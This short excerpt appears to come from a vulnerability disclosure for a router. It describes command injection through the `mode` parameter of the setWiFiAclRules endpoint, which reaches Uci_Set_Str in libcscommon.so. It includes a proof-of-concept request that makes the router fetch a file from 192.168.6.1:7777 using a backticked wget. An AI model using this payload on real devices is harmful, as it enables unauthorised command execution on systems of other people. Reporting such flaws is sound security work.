...
In  sub_435C2C function, it reads in a user-provided parameter `mode` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
We set `mode` as **\`wget 192.168.6.1:7777/testpoc\`** , and the router will execute it,such as:
...
{"topicurl":"setWiFiAclRules","wifiIdx":"1","mode":"`wget 192.168.6.1:7777/testpoc`"
}
```
